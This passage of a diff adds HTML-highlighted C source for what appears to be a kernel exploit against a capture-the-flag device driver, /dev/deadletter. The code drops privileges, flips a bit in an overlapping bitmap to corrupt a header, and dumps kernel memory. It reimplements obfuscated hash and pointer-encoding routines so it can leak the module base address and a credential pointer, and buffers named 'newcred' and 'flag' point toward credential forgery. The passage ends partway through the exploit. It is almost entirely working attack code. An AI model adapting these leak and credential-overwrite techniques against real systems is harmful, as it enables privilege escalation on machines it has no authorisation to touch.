+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">ecx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xd</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rdx</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">L</span><span class="p">[</span><span class="n">rdx</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rsi</span><span class="p">;</span>
+<span class="w">            </span><span class="n">rax</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">r8</span><span class="p">;</span>
+<span class="w">            </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rol64</span><span class="p">(</span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">ecx</span><span class="p">);</span>
+<span class="w">            </span><span class="n">rax</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="n">r10</span><span class="p">;</span>
+<span class="w">            </span><span class="n">r8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">ecx</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">7</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rdx</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rsi</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">r9</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">ecx</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x45</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">r8</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="n">r8</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mh">0x1d</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">func70</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">S</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rdx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1f83d9abfb41bd6bULL</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">S</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">esi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">r8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc7069c1dfa2d2477ULL</span><span class="p">;</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">r9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xa24baed4963ee407ULL</span><span class="p">;</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">r10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xae4c415dULL</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">L</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">];</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">ecx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">esi</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rax</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">r8</span><span class="p">;</span>
+<span class="w">        </span><span class="n">r8</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">r9</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rdx</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">esi</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">r10</span><span class="p">;</span>
+<span class="w">        </span><span class="n">t</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="mh">0x25</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">ea</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">t</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">;</span>
+<span class="w">        </span><span class="n">ecx</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">ea</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span>
+<span class="w">        </span><span class="n">ecx</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0xb</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rol64</span><span class="p">(</span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">ecx</span><span class="p">);</span>
+<span class="w">        </span><span class="n">rdx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rdx</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="n">rdx</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mh">0x17</span><span class="p">);</span>
+<span class="w">        </span><span class="n">esi</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">esi</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x41</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rdx</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">rol64</span><span class="p">(</span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1f</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">hash_slot</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6a09e667f3bcc909ULL</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">acc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x9e37UL</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rcx</span><span class="p">,</span><span class="w"> </span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">idx</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">val</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rol64</span><span class="p">(</span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">);</span>
+<span class="w">        </span><span class="n">rcx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span>
+<span class="w">        </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x38e38e39ULL</span><span class="p">;</span>
+<span class="w">        </span><span class="n">q</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="mh">0x23</span><span class="p">;</span>
+<span class="w">        </span><span class="n">eax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">q</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">9</span><span class="p">;</span>
+<span class="w">        </span><span class="n">eax</span><span class="w"> </span><span class="o">&lt;&lt;=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">        </span><span class="n">edx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">eax</span><span class="p">;</span>
+<span class="w">        </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">edx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">edx</span><span class="p">;</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">idx</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
+<span class="w">        </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">val</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">acc</span><span class="p">;</span>
+<span class="w">        </span><span class="n">r</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">rcx</span><span class="p">;</span>
+<span class="w">        </span><span class="n">r</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="mh">0x100000001b3ULL</span><span class="p">;</span>
+<span class="w">        </span><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+<span class="w">        </span><span class="n">acc</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x9e37</span><span class="p">;</span>
+<span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0xd</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">acc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x16ddf3</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">enc_ptr</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">fn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rol64</span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fn</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">ror64</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">page</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">slot</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">letter</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">active</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">page_ptr</span><span class="p">,</span><span class="w"> </span><span class="n">H</span><span class="p">,</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">C</span><span class="p">,</span><span class="w"> </span><span class="n">W</span><span class="p">,</span><span class="w"> </span><span class="n">key1</span><span class="p">,</span><span class="w"> </span><span class="n">key2</span><span class="p">,</span><span class="w"> </span><span class="n">f0addr</span><span class="p">,</span><span class="w"> </span><span class="n">text_base</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">letter_val</span><span class="p">,</span><span class="w"> </span><span class="n">slot40_orig</span><span class="p">,</span><span class="w"> </span><span class="n">cred_ptr</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">token</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">slotbuf</span><span class="p">[</span><span class="mh">0x80</span><span class="p">],</span><span class="w"> </span><span class="n">letterbuf</span><span class="p">[</span><span class="mh">0x80</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">newcred</span><span class="p">[</span><span class="mh">0xb0</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">setgid</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setgid&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setuid&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] running as uid=%d euid=%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">getuid</span><span class="p">(),</span><span class="w"> </span><span class="n">geteuid</span><span class="p">());</span>
+
+<span class="w">    </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/deadletter&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDWR</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;open /dev/deadletter&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] opened /dev/deadletter</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 1. bitmap overlaps header: bit 0x44c sets bit 12 of header[8] */</span>
+<span class="w">    </span><span class="n">set_bit</span><span class="p">(</span><span class="mh">0x44c</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 2. dump body + slots + letter */</span>
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">page_read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe00</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;page_read&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">letter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xa00</span><span class="p">);</span><span class="w">   </span><span class="cm">/* page+0xc00 */</span>
+<span class="w">    </span><span class="n">H</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">letter</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span><span class="w">                          </span><span class="cm">/* active handle */</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] active handle = 0x%016lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">H</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">9</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">slot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x200</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x80</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">slot</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">H</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">active</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">active</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] active slot not found</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="n">slot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x200</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">active</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x80</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] active slot index = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">active</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">page_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">slot</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">slot</span><span class="p">;</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">C</span><span class="p">,</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x30</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x34</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x38</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">H</span><span class="p">,</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x08</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">slot40_orig</span><span class="p">,</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">W</span><span class="p">,</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x30</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] page=0x%016lx A=0x%08x B=0x%08x C=0x%08x H=0x%016lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">           </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">page_ptr</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">C</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">H</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">key1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">A</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x100000001ULL</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">H</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0xd1ceb00bcafebeefULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">key2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">A</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x100000001ULL</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">rol64</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1d</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">H</span>
+<span class="w">           </span><span class="o">^</span><span class="w"> </span><span class="mh">0xa3a1c57fafd3c8ddULL</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">f0addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ror64</span><span class="p">(</span><span class="n">slot</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">ror64</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb</span><span class="p">),</span><span class="w"> </span><span class="mh">0x11</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">key1</span><span class="p">;</span>
+<span class="w">    </span><span class="n">text_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f0addr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0xf0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] decoded .text+0xf0 = 0x%016lx  (module base 0x%016lx)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">           </span><span class="n">f0addr</span><span class="p">,</span><span class="w"> </span><span class="n">text_base</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">f0addr</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfff</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0xf0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] pointer decode failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">letter_val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">letter</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">    </span><span class="n">cred_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ror64</span><span class="p">(</span><span class="n">letter_val</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">ror64</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb</span><span class="p">),</span><span class="w"> </span><span class="mh">0x11</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">key2</span><span class="p">;</span>
